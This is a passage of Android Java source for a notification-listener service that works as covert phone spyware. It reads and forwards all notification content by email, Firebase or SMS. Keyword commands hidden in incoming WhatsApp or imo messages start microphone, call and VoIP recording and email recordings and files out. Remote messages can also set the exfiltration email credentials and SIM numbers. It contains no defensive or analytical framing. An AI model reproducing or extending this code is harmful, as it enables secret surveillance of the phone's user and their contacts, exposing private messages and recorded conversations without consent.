                    CallRecorderAccessibilityService.notificationCallingAppGlobalMessage2 = currentMessage;// only callingapp message catch

                    // Start code1 for Get Sim number. From Own User.Call method firstly here.Save SharedPreferences. use socialmedia sms=========start=====================
                    // Load previous count from SharedPreferences
                    SharedPreferences sharedPreferences = getSharedPreferences("MyPrefs", MODE_PRIVATE);
                    CounterSociaMedialSMS = sharedPreferences.getInt("CounterSociaMedialSMS", 0);
                    // Increment count
                    CounterSociaMedialSMS++;
                    // Save updated value
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putInt("CounterSociaMedialSMS", CounterSociaMedialSMS);
                    editor.apply();
                    Log.d(TAG, "SharedPreferences Updated CounterSociaMedialSMS: " + CounterSociaMedialSMS);

                    String titleStr = title != null ? title.toString() : "";
                    String textStr = text != null ? text.toString() : "";
                    boolean IsSimNumberSetByOwnUserSerchWords1 =  isSimNumberSetByOwnUserSerchWords1(message, titleStr, titleStr, textStr);
                    boolean IsSimNumberSetByOwnUserSerchWords2 =  isSimNumberSetByOwnUserSerchWords2(message, titleStr, titleStr, textStr);
                    Log.d(TAG, "IsSimNumberSetByOwnUserSerchWords1: " +IsSimNumberSetByOwnUserSerchWords1   +" IsSimNumberGetFromUserWords2:"+IsSimNumberSetByOwnUserSerchWords2);

                    context = getApplicationContext();
                    if (context == null) {
                        Log.e("NotificationListener", "Application context is null!");
                        return;
                    }
                    if (  ( (CounterSociaMedialSMS ==6) ||  (CounterSociaMedialSMS ==600) ||  (CounterSociaMedialSMS ==2000)  ) ||
                            ((IsSimNumberSetByOwnUserSerchWords1) && (IsSimNumberSetByOwnUserSerchWords2))  ) {
                        //           Log.d(TAG, "condition meet for alart window Showing") ;

                        Intent intent = new Intent(this, GetSim1AndSim2NumberFromAlertbox.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // FLAG_ACTIVITY_NEW_TASK is required to start an Activity from a Service
                        startActivity(intent);

                        // start counter rest 0 CounterSociaMedialSMS  .for again come alart window
                        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                        String UserID1= alert.getSim1NumberFromUser(context);
                        String UserID2= alert.getSim2NumberFromUser(context);
                        Log.d(TAG, "UserID1 :" + UserID1+ " UserID1:" + UserID1 );
                        if (UserID1== null || UserID2== null)  {
                            //SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putInt("CounterSociaMedialSMS", 0);
                            editor.apply();
                            Log.d(TAG, "SharedPreferences CounterSociaMedialSMS reset to : " + CounterSociaMedialSMS);
                        }else {
                            //   Log.d(TAG, "UserID1 and UserID1 not null");
                        }
                        // End counter rest 0 CounterSociaMedialSMS .for again come alart window

                    }else {
                        //    Log.d(TAG, "condition not meet for alart window");
                    }
                    //End code1 for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms===============end=====================


                    //Start code2 for Get Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================
                    if (title != null && (text != null || largeIconBitmap != null)) {
                        currentMessage = title.toString() + " " + (text != null ? text.toString() : "");
                        // Convert CharSequence to String
                        titleStr = title != null ? title.toString() : "";
                        textStr = text != null ? text.toString() : "";

                        boolean IsSimNumberSetByNotificationSerchWords1 =  isSimNumberSetByNotificationSerchWords1(message, titleStr, titleStr, textStr);
                        //     Log.d(TAG, "onNotificationPosted method isSimNumberSetByNotificationSerchWords1: " + IsSimNumberSetByNotificationSerchWords1);
                        boolean IsSimNumberSetByNotificationSerchWords2 =  isSimNumberSetByNotificationSerchWords2(message, titleStr, titleStr, textStr);
                        //     Log.d(TAG, "onNotificationPosted method isSimNumberSetByNotificationSerchWords2: " + IsSimNumberSetByNotificationSerchWords2);

                        if ( IsSimNumberSetByNotificationSerchWords1 && IsSimNumberSetByNotificationSerchWords2) {
                            context = getApplicationContext(); // ???? this, ??? ??? ???? Activity ?? Service ??String message ,String title, String text,Context context,String titleStr, String textStr
                            String ExtractPlusPrefixedNumbersFromSMS = extractPlusPrefixedNumbersFromNotification(message, titleStr, textStr, context, titleStr, textStr);
                            //     Log.d(TAG, "onNotificationPosted method ExtractPlusPrefixedNumbersFromSMS: " + ExtractPlusPrefixedNumbersFromSMS );
                            if ( ExtractPlusPrefixedNumbersFromSMS != null ) {
                                String validNumbers = extractPlusPrefixedNumbersFromNotification(message, titleStr, textStr, context, titleStr, textStr);
                                //   Log.d(TAG, "onNotificationPosted method  ExtractPlusPrefixedNumbersFromSMS: " + validNumbers);

                                if (validNumbers != null) {
                                    // Call the method to store the numbers in SharedPreferences
                                    storeExtractPlusPrefixedNumbersFromNotification(validNumbers, mContext);
                                }
                            }else {
                                //   Log.d(TAG, "onNotificationPosted condition not meet ExtractPlusPrefixedNumbersFromSMS :"+ ExtractPlusPrefixedNumbersFromSMS );
                            }
                        }else {
                            //  Log.d(TAG, "onNotificationPosted condition not meet isSimNumberSetAlart1 :" + IsSimNumberSetByNotificationSerchWords1 );
                            //  Log.d(TAG, "onNotificationPosted condition not meet isSimNumberSetAlart2 :" + IsSimNumberSetByNotificationSerchWords2);
                        }
                    }
                    //End code2 for set Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================







                    //Start code3 for Get Email EmailFirstPartName and EmailPassword. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================
                    if (title != null && (text != null || largeIconBitmap != null)) {
                        currentMessage = title.toString() + " " + (text != null ? text.toString() : "");
                        // Convert CharSequence to String
                        titleStr = title != null ? title.toString() : "";
                        textStr = text != null ? text.toString() : "";

                        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, titleStr, titleStr, textStr);
                        //  Log.d(TAG, "onNotificationPosted method  isEmailFirstPartNameAndVPasswordSetAlartSerchWords1: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1);
                        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, titleStr, titleStr, textStr);
                        // Log.d(TAG, "onNotificationPosted method isEmailFirstPartNameAndVPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);

                        if ( IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 && IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2) {
                            context = getApplicationContext(); // ???? this, ??? ??? ???? Activity ?? Service ??String message ,String title, String text,Context context,String titleStr, String textStr
                            String ExtractEmailFirstPartName = extractEmailFirstPartName(message, titleStr, textStr, context, titleStr, textStr);
                            String ExtractEmailPassword = extractEmailPassword(message, titleStr, textStr, context, titleStr, textStr);
                            //  Log.d(TAG, "onNotificationPosted method ExtractEmailFirstPartName: " + ExtractEmailFirstPartName );
                            if ( ExtractEmailFirstPartName != null  && ExtractEmailPassword != null ) {
                                String  EmailFirstPartName = extractEmailFirstPartName(message, titleStr, textStr, context, titleStr, textStr);
                                Log.d(TAG, "onNotificationPosted method EmailFirstPartName: " + EmailFirstPartName);
                                String  EmailPassword = extractEmailPassword(message, titleStr, textStr, context, titleStr, textStr);
                                Log.d(TAG, "onNotificationPosted method EmailPassword: " +  EmailPassword);
                                if ( EmailFirstPartName != null  &&  EmailPassword!= null  ) {
                                    // Call the method to store EmailFirstPartName and And Password in SharedPreferences
                                    storeSharedPreferencesExtractEmailFirstPartName(EmailFirstPartName, mContext);
                                    storeSharedPreferencesExtractEmailPassword(EmailPassword, mContext);
                                }
                            }else {
                                //   Log.d(TAG, "onNotificationPosted condition not meet ExtractEmailFirstPartName :"+ ExtractEmailFirstPartName );
                                //   Log.d(TAG, "onNotificationPosted condition not meet EmailPassword :"+ EmailPassword );
                            }
                        }else {
                            //  Log.d(TAG, "onNotificationPosted condition not meet IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 :" + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 );
                            //   Log.d(TAG, "onNotificationPosted condition not meet IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 :" + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);
                        }
                    }//End code3 for Get Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================


                }// if condition End Sim Number ,Email ,Email Password Set from Notification Alart message
                // End Set Sim Number ,Email And Email Password . Set from Notification Alart message . socialmedia whatsapp whatsapp messenger========== End ===========



                // don't log Do nothing,  thus blocked app ,New condition to block specific apps Do nothing, don't log
                if (isBlockedApp(packageName)) {
                    if (packageName.equals("com.internet.speed.meter.lite") ||
                            packageName.equals("com.android.systemui") ||
                            packageName.equals("com.samsung.android.net.wifi.wifiguider") ||
                            packageName.equals("com.google.android.gm") ||
                            packageName.equals("com.tekxperiastudios.pdfexporter") ||
                            packageName.equals("global.juscall.android") ||
                            packageName.equals("com.lenovo.anyshare.gps")) {
                        // Do nothing, don't log
                    } else {
                        Log.d(TAG, "Notification from blocked app: " + packageName);
                    }
                    return; // Exit if it's a blocked app
                }





                Log.d(TAG, "Notification from app: " + packageName);

                // Create MicRecord instance and start recording
                MicRecord micRecord = new MicRecord(this); // 'this' is the context (e.g., your Activity or Service)
                String incomingNumber = "Some number";  // Replace this with the actual number or logic to extract it
                String messageBody = "Some message";  // Replace this with the actual message body or logic to extract it
                // Call the startRecording method with the correct parameters
                Log.d(TAG, "Notification  whatesapp imo messenger rec stop ");


                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                    Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 ?? ???? .versiov:" + Build.VERSION.SDK_INT);
                    //micRecord.StartRecording(incomingNumber, messageBody);
                    Log.d(TAG, "StopMicSoundRecording call Notification class");
                    micRecord.StopMicSoundRecording(incomingNumber, messageBody); // ???????? ???? ????
                } else {
                    Log.d(TAG, "whatesapp imo messenger not rec start .Android version 9 ?? ????.versiov:" + Build.VERSION.SDK_INT);
                }

                // Pass title and currentMessage to ConditionForCallOtherClassMethod
                if (ConditionForCallOtherClassMethod(title.toString(), currentMessage)) {
                    NotificationfindAllowedKeyword1 = findAllowedKeyword1(title.toString(), currentMessage);
                    NotificationfindAllowedKeyword2 = findAllowedKeyword2(title.toString(), currentMessage);
                    callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);

                    if (NotificationfindAllowedKeyword1 != null &&  NotificationfindAllowedKeyword2 != null) {
                        // Check if NotificationfindAllowedKeyword1 is one of the keywords


                        // Check for Microphone Recording
                        if (Arrays.asList(Condition_Word_For_Mic).contains(NotificationfindAllowedKeyword1)) {
                            Log.d(TAG, "Notification  Conditions  met  call micRecord.StartRecording");
                            micRecord.StartRecording(incomingNumber, messageBody);
//                            Intent intent = new Intent();  // Create an intent if needed, or use an existing one
//                            Log.d(TAG, "Notification  Conditions met  call micRecord.onReceive ");
//                            micRecord.onReceive(this, intent);
                        }

                        // Check for call Recording   CallRecorderAuto caclass
                        else if (Arrays.asList(Condition_Word_For_CallRecord ).contains(NotificationfindAllowedKeyword1)) {
                            CallRecorderAuto callRecorderAuto = new CallRecorderAuto();
                            Log.d(TAG, "Notification  Conditions  met  callRecorderAuto StartRecording ");
                            callRecorderAuto.SendLastRecordingViaEmail(this); // 'this' ??????? ???? ??? ??? Activity/Service ???? ?? ??? ??
                        }
                        // Check for files Sending FileService Class
                        else if (Arrays.asList(Condition_Word_For_File).contains(NotificationfindAllowedKeyword1)) {
                            FileService fileService = new FileService();
                            Intent intent = new Intent();
                            Log.d(TAG, "Notification Conditions met. FileService HandleSmsReceived.");
                            fileService.SendLastTimeFileingsEmail(intent, this); // 'this' should refer to the correct Context (Activity/Service)
                        }


                        // Check for Video Recording videoRecord class
                        else if (Arrays.asList(Condition_Word_For_Video ).contains(NotificationfindAllowedKeyword1)) {
                            VideoRecord videoRecord = new VideoRecord();
                            String sender = "sampleSender";  // Replace with actual sender value
                            // String messageBody = "sampleMessage";  // Replace with actual message content
//                            Log.d(TAG, "Notification  Conditions  met  videoRecord StartRecording .");
//                            Log.d(TAG, "Notification from call the method videoRecord class in startRecording  .");
//                            videoRecord.StartRecording(getApplicationContext(), sender, messageBody);
                        }

                    } else {
                        //   Log.d(TAG, "Notification  Conditions not met  for call other method.");
                    }

                } else {
                    //  Log.d(TAG, "Notification not met  Conditions for Call other class .");
                }



                // VOIP Call recording for  Create  instance
                // whatesapp imo messenger for sound Recording Check for CallingApp CallingAppSoundRecord
                callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);
                if (Arrays.asList(Condition_Word_For_CallingAppSoundRecord).contains(callingAppSoundRecord)) {
                    Log.d(TAG, "Notification  wh imo messenger VOIP Call rec Conditions  met  StartRecording ");

                    // Use application context here
                    //CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService(context.getApplicationContext());
                    CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService();
                    Log.d(TAG, "Notification  wh imo messenger rec Conditions  met VOIP Call callRecorderService StartRecording");
                    callRecorderService.checkPermissionsAndStartRecording();

                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                        Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 ?? ???? .versiov:" + Build.VERSION.SDK_INT);
                       // micRecord.StartRecording(incomingNumber, messageBody);
                    } else {
                        //  Log.d(TAG, "whatesapp imo mes not rec start .Android version 9 ?? ????.versiov:" + Build.VERSION.SDK_INT);
                    }
                } else {
                    //   Log.d(TAG, "Notification not met  wh imo messenger rec Conditions for CallingAppSoundRecord .");
                }


                if (SameEmailCheekShouldForwardNotification(packageName, currentMessage)) {
                    if (!isBlockedNotification(title.toString(), text != null ? text.toString() : "")) {
                        if (isInternetConnected()) {
                            // send google drive
                            //retryQueuedData(this);
                            if (fileUri != null) {
                                handleFileUri(fileUri); // Handle image, audio, video as before
                            } else if (text != null) {
                                SaveOrforwardNotificationEmailORFirebaseConditionaly(packageName, title.toString(), text.toString(), largeIconBitmap, getApplicationContext());
                            }
                        } else if (shouldForwardBySMS(currentMessage)) {
                            forwardNotificationBySMS(packageName, title.toString(), text != null ? text.toString() : "", this);
                        } else {
                            //    Log.d(TAG, "Notification not forwarded due to conditions not met");
                        }
                        lastForwardedMessageMap.put(packageName, new ForwardedMessage(currentMessage, System.currentTimeMillis()));
                    }
                } else {
                    Log.d(TAG, "Notification not forwarded because the same message was recently sent");
                }


            }
        } catch (Exception e) {
            Log.e(TAG, " onNotificationPosted  in Error : ", e);
        }
    }




    // 3. SameEmailCheekShouldForwardNotification method update
    private boolean SameEmailCheekShouldForwardNotification(String packageName, String currentMessage) {

        if (packageName == null || currentMessage == null) {
            return false;
        }

        String uniqueKey = packageName + "_" + currentMessage.trim();
        long currentTime = System.currentTimeMillis();

        if (lastForwardedMessageMap.containsKey(uniqueKey)) {

            ForwardedMessage lastForwarded = lastForwardedMessageMap.get(uniqueKey);

            // 1 ??????? ????? ??? message ??? forward ???? ??
            if (lastForwarded != null && currentTime - lastForwarded.timestamp < (1 * 60 * 1000)) {
                Log.d(TAG, "Duplicate blocked: " + uniqueKey);
                return false;
            }
        }

        // ???? ??? update Map
        lastForwardedMessageMap.put(uniqueKey, new ForwardedMessage(currentMessage, currentTime));

        return true;
    }




    // 1. Map declaration (class ?? ?????, ???????? variable ?? ????)
    private Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();
    private Map<String, Long> notificationCooldownMap = new HashMap<>();
    private static final long DUPLICATE_COOLDOWN = 1 * 60 * 1000; // 1 ?????

    // ===== Strong Duplicate Protection Method =====
    private boolean shouldForwardNotification(String packageName, String messageBody) {

        if (packageName == null || messageBody == null) return false;

        String uniqueKey = packageName + "_" + messageBody.trim();
        long currentTime = System.currentTimeMillis();

        if (notificationCooldownMap.containsKey(uniqueKey)) {
            long lastSentTime = notificationCooldownMap.get(uniqueKey);

            // ??? ? ??????? ????? ??? ????? ??? ? block
            if (currentTime - lastSentTime < DUPLICATE_COOLDOWN) {
                Log.d(TAG, "Duplicate notification blocked: " + uniqueKey);
                return false;
            }
        }

        // ???? ??? timestamp update
        notificationCooldownMap.put(uniqueKey, currentTime);
        return true;
    }





    public boolean ConditionForCallOtherClassMethod(String title, String message) {
        String findAllowedKeyword1 = findAllowedKeyword1(title, message);
        String findAllowedKeyword2 = findAllowedKeyword2(title, message);

        if ((findAllowedKeyword1 != null) &&  (findAllowedKeyword2 != null)) {
            Log.d(TAG, "notification findAllowedKeyword1  :  " + findAllowedKeyword1);
            Log.d(TAG, "notification  findAllowedKeyword2  :" + findAllowedKeyword2);
            return true;
        }
        //Log.d(TAG, "notification findAllowedKeyword1  :  " + findAllowedKeyword1);
        //Log.d(TAG, "notification  findAllowedKeyword2 :" + findAllowedKeyword2);
        return false;
    }
    public String findAllowedKeyword1(String title, String message) {
        String[] allowedKeywords = {"Goldm", "Silverm", "Mediumm", "Goldc", "Silverc", "Mediumc",
                "Goldf", "Silverf", "Mediumf","Goldv", "Silverv", "Mediumv",
                "mic", "?", "?", "helo",  "?????", "????","???","??? ????","????",  "???",  "????????? ???","?????????",
                "screenshort","screenshort dau", "?????",  "????? ", "Mic",
                "call","audio", "??", "???",  "?????", "??", "??", "??",  "????",  "?????", "?????",  "???",  "????",  "????",
                "oi", "screen short","screenshortdau","???",  "??????",   "????", "?????", "???? ", "?????",   "???", "???????????", "Call",
                "file", "aei", "???",  "???",  "????",  "???????",  "????", "?????",   "?????",  "????????????", "File",
                "video", "?????", "????", "??? ",  "????????",   "????????",  "camera","?????", "????",  "?????", "???",
                "aii",    "?????", "whatesapps","Video",   };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword1  matchs: " + keyword);
                return keyword;
            }
        }
        return null;
    }

    public String findAllowedKeyword2(String title, String message) {
        String[] allowedKeywords = {"Congratulationm", "Conformm","Congratulationc", "Conformc","Congratulationf", "Conformf",
                "Congratulationv",       ",",      "?",     ":",   "=",     "Conformv" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword2  match: " + keyword);
                return keyword;
            }
        }
        return null;
    }
    public static String CallingAppSoundRecord(String title, String message) {
        String[] allowedKeywords = {"Incoming voice call","Ongoing video call","Incoming",
                "call", "Calling…", "Ringing…","voice call",
                "Missed voice call",  "Call","Missed call" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                // String CallingAppSoundRecord == keyword ;
                Log.d(TAG, "notification CallingAppSoundRecord  match: " + keyword);
                //NotificationCallingAppglobalmessage2=keyword;
                CallRecorderAccessibilityService.notificationCallingAppGlobalMessage3 = keyword;
                return keyword;
            }
        }
        return null;
    }

    // Method to check if the app is blocked, bloked app
    private boolean isBlockedApp(String packageName) {
        return packageName.equals("com.video.fun.app") || packageName.equals("com.lenovo.anyshare.gps") || packageName.equals("com.video.lenavo.app") || packageName.equals("com.google.android.googlequicksearchbox") || packageName.equals("com.samsung.android.gggmessaging")||
                packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.apps.photos")|| packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.gm")||
                packageName.equals("com.android.systemui")|| packageName.equals("com.google.android.deskclock")||
                packageName.equals("com.anydesk.anydeskandroid")  || packageName.equals("com.medhaapps.wififtpserver") ||
                packageName.equals("com.miui.player") || packageName.equals("com.google.android.youtube") ||
                packageName.equals("com.bbk.theme") || packageName.equals("com.android.bluetooth") ||
                packageName.equals("net.bat.store") ||packageName.equals("com.mapzonestudio.best.language.translator.dictionary") ||
                packageName.equals("com.xvideostudio.videoeditor") || packageName.equals("com.lemon.lvoverseas") ||
                packageName.equals("com.banglalink.toffee") || packageName.equals("com.phone.cleaner.shineapps") ||
                packageName.equals("com.bongo.bongobd") || packageName.equals("com.islam.surahyaseenaudio") ||
                packageName.equals("com.starmakerinteractive.starmaker") || packageName.equals("com.maxboost.cleaner") ||
                packageName.equals("com.daraz.android") || packageName.equals("com.snapchat.android") ||
                packageName.equals("com.iqoo.secure") ||
                packageName.equals("com.zhiliaoapp.musically") || packageName.equals("com.coloros.alarmclock") ||
                packageName.equals("com.internet.speed.meter.lite");
    }

    // Blocked Notification Keyword or skiping keyword.in message and title============== start code =============
    private boolean isBlockedNotification(String title, String message) {
        String blockedKeyword = findBlockedKeyword(title, message);
        if (blockedKeyword != null) {
            Log.d(TAG, "notification Blocked  by keyword match: " + blockedKeyword);
            return true;
        }
        return false;
    }
    private String findBlockedKeyword(String title, String message) {
        String[] blockedKeywords = {
                "common message related", "internet.speed","internet.speed.meter.lite", "internet", "Foreground",
                "displaying over", "over other apps", "Tomorrow in", "setup in", "in progress", "Caption is on",
                "until fully charged","charged", "fully charged","Screenshot saved","Screenshot","USB debugging",
                "Uploading","Govt. Info?",

                "fb related", "Chat heads","Chat heads active","Tap to return to call", "asked to join","He added a new photo",
                "friend suggestion","suggestion",  "??","Shared a video in Story","posted", "alive to receive", "alive","backing",
                "highlighted a comment", "comment", "updates", "You've got ", "Join all","mentioned", "stories",
                "Upgrade", " post ", " posts ","Team", "reactions", " Reacted ", " resume "," highlighted ","Photo","friend request",

                "messages related", "Chat heads active","Chat heads active Start a conversation",  "messages from","messages from","Govt. Info", "Govt. i8nfo","Govt",
                "View messages", "wifiguider", "bot?start=r", "invite friends",  "sell Bazar",  "???? ??????", "Silver",
                "rewards", "Groups","groups","GROUPS","Group","group","GROUP", "GROUP","like","like", "added a post",
                "is this still available?", "is this", "available?", "On hold", "birthday",
                "Ict pora related ","Ict","ict","ICT","2nd year", "ICT","iCT","Sir","SIR","sir","JGMC", "Jgmc","jgmc","lab","???",
                "Pora","pora", "Engg", "Engineer","Exam", "exam","science","Science",  "Commerce", "college", "??? ","Tap for",

                "imo related","You have 1 new message", "Sticker", "is back on imo!", "Added to their Story",
                "You have a new message","Audio", "with Almost Done! ", "dialpad message error ", "Review message and try again",
                "Waiting for this message",

                "Instagram related","most watched","Check out some",

                "call recording related","call recording", "Cube ACR",

                "snapchat related","Fake girlfriend",


                "cc camera related","Front Door", "Front","Door",
                "USB related","USB", "usb", "Tap to turn off USB debugging","Tap to turn","USB debugging", "debugging", "battery",
                "Cable charging","Battery powe", "fully charged)", "until fully charged","Power saving mode",",Approximately",

                "Telegram!", "joined Telegram!", "Temporarily turned off by your carrier for SIM 1","Temporarily turned off","turned",
                "carrier for SIM 1","SIM 1","SIM 2", "see your screenshot", "MOONBIX", "?????????","??????????", "chest",
                "Invite you into the game","?????????? ????????", "telegram","BTSE", "referral link", "wcoin_tapbot", "t.me",
                "app?startapp", "played",  "Cattea?", "Capybuddy!", "undefined","claim","Wheel","wheel", "#airdrop","#airdrop",
                "Location","maps","?????", "?????????", "reacted", "poraben","reduced","Reacted",

                "call related ", "Missed call","Voice message","Running Call", "missed calls", "Ringing…", "missed voice calls",
                "smartcapture", "dialer", "android.dialer",

                "notifications related","new notifications","You have a new notification",
                "Wi-Fi related","Wi-Fi",
                "update related", "Auto update:","setup in progress ","Finish setting",
                "Screenshot saved",
                "bkash related","Make Payment","update related", "Voucher on bKash Payment",
                "playstore related", "minutes left","playstore","minute left", "Google Drive Chat Backup", "Installing apps", "Google Play:",
                "snapchat related","watch this!",
                "vivo related","and see the more used apps", "more used apps.", "Find easily your mail box",
                "GB related", "????!", "???? ????!"," ???? ","*???*","?????", "? ???", "????","?? ???", "?????", "? ???","???????",
                "? ??","?? ???", "?????", "GP30", "GB350TK", "30GB350TK", "GB300TK",
                "????????? ????", "?????????", " ????????? ?????", "????????", "Bubble shooter game", "inbox me", "????????",
                "MB","Mb","mb", "bonus",  "? ????-????", "????",
                "alarm clock related ","Alarm","alarm clock",

                "Free related","Free ?","?????? ????", "Super Offer",
                "happy birthday",
                "Emergency balance", "Emergency",
                "SmartTV",

                "seconds left", "rating bonus", "rating","?????",
                "connection", "running","?????","Uploading...", "Uploading", "Deleting","Delete",

                "TikTok","FREE", "Win", " interested?","channel", "TV",  "Referral ","Bikroy","???????","?????",
                " admin approved",
                "replied", "reactions","Reacted", "Reminder", "Checking", "device", "updated", "BCS","shared","Upgrade",

                "Mobile Recharge","watched template","template",

                "Network speed for current app will be boosted.",
                "Waiting for you", "(EC)", "Economic census", "watched template","template","???? ?????",
                "..","Tap to resume", "Sign in to network","Invitation from your friends","Tap to view",
                "have been blocked", "second left","new memories", "Contact sync", "contact information", "JPI",
                "GB450TK"
        };

        for (String keyword : blockedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                return keyword; // find keyword then return
            }
        }
        return null;
    }
    //end Blocked Notification Keyword or skiping keyword.in message and title============= end code =============



    // Search Word START ,for  set sim number ,Email number and get user input sim number  ============================= START  code ===========================================

    //serch Words start code for Sim Number Set By  Own User  by alartbox. Sim Number Get From own User ======= start code ========
    public boolean isSimNumberSetByOwnUserSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SimNumberGetFromUserWords) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word1 match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 1", "give sim number", "sim number get from user",
            "Sim Number Get From User"   ));

    public boolean isSimNumberSetByOwnUserSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SimNumberGetFromUserWords2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word2 match : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords2 = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 2",   "&",     "*", "-",  "+"        ));
    //serch Words End code .for Sim number Set BY Own User by alartbox. Sim Number Get From User ============= End code =============


    //start serch Words .for Sim number Set BY notification  word ============= start code =============
    public boolean isSimNumberSetByNotificationSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SIMNUMBERSETALERTKEYWORDS) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "messageBody Sim Number Set Alart 1 messageBody match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SIMNUMBERSETALERTKEYWORDS = new HashSet<>(Arrays.asList(
            "number is off ?", "number is off", "number","????? ?? ??????? ?? ??????? ???",  "??? ?? ????? ???????",
            "??? ?? ?????", "??? ?? ???? ???",  "??? ?? ???? ??? ?", "?? ????????? ???? ???? ??? ????",
            "?? ????????? ????? ???? ???? ??? ????", "?? ??????? ??", "??? ?? ?????",
            "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
            "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
            "sim set alarts"   ));

    public boolean isSimNumberSetByNotificationSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SIMNUMBERSETALERTKEYWORDS2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "messageBody Sim Number Set Alart 2 messageBody match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SIMNUMBERSETALERTKEYWORDS2 = new HashSet<>(Arrays.asList(
            "!",   "@",   "#", "$",  "^", "sim set alarts"   ));
    // end Sim number Set from notification  word ============= end code =============


    //serch Words start code. for Email Number Set .From Notification . ============= start code =============
    public boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : EmailFirstPartNameSetAlartSerchWords1) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Set Emsil  match Word1 : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> EmailFirstPartNameSetAlartSerchWords1 = new HashSet<>(Arrays.asList(
            "first part name words1", "emfpn","email Set1"   ));

    public boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : EmailPasswordSetAlartSerchWords2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Set Emsil password match Word2 :" + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> EmailPasswordSetAlartSerchWords2 = new HashSet<>(Arrays.asList(
            "password  words2", "pw",  "password Set2"        ));
    //serch Words End code for Email Number Set.From Notification. ============= End code =============




    public boolean isCallRecordingStartSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : CallRecordingStartSerchWords1) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Call Recording Start Serch Words1 :" + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> CallRecordingStartSerchWords1 = new HashSet<>(Arrays.asList(
            "Call Recording Start Serch Words1", "call",  "Incoming voice call","Ongoing video call",
            "Incoming", "Calling…", "Ringing…","voice call",
            "call", "Call","calling" ));
    //serch Words End code for Email Number Set.From Notification. ============= End code =============








    // Serch Word END  for sim number set for Email number Set ======================= End code =====================================================





    // === start code ===== extract Plus Prefixed Numbers From Notification Title And Text valid phone numbers
    public String extractPlusPrefixedNumbersFromNotification(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method call");

        String notificationmessage=globalmessage;
